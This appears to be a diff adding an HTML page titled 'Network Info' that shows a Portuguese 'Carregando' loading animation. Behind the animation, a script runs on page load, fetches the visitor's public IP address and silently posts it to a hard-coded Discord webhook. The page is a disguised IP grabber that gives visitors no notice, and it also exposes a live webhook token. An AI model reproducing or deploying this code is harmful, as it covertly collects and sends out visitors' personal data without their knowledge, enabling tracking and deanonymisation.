@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Info</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            perspective: 1000px;
+        }
+
+        .container {
+            text-align: center;
+            color: white;
+            font-family: Arial, sans-serif;
+            transform: rotateX(20deg);
+        }
+
+        .loading-text {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+
+        .dots {
+            font-size: 24px;
+            color: red;
+        }
+
+        .dots:after {
+            content: "";
+            animation: dots 0.5s infinite;
+        }
+
+        @keyframes dots {
+            0% {
+                content: "";
+            }
+            25% {
+                content: ".";
+            }
+            50% {
+                content: "..";
+            }
+            75% {
+                content: "...";
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loading-text">Carregando</div>
+        <div class="dots" id="dots"></div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var dots = document.getElementById("dots");
+
+            function updateDots() {
+                dots.innerHTML += ".";
+                if (dots.innerHTML.length > 3) {
+                    dots.innerHTML = "";
+                }
+            }
+
+            setInterval(updateDots, 500);
+
+            fetch("https://httpbin.org/ip")
+            .then(response => response.json())
+            .then(data => {
+                sendToDiscord(data.origin);
+            })
+            .catch(error => {
+                console.error("Erro ao obter endereço IP:", error);
+            });
+        });
+
+        function sendToDiscord(ip) {
+            var webhookURL = "https://discord.com/api/webhooks/1212900989154099250/6LQWxqzmarY9YUxPLLF2h6kQrYrcjV7NJuaNbVUs4k4RhNBrvEbduTX4IFreMq7T48XF";
+            var message = "Endereço IP: " + ip;
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Erro ao enviar mensagem para o webhook");
+                }
+                console.log("Mensagem enviada com sucesso!");
+            })
+            .catch(error => {
+                console.error(error);
+            });
+        }
+    </script>
+</body>
+</html>
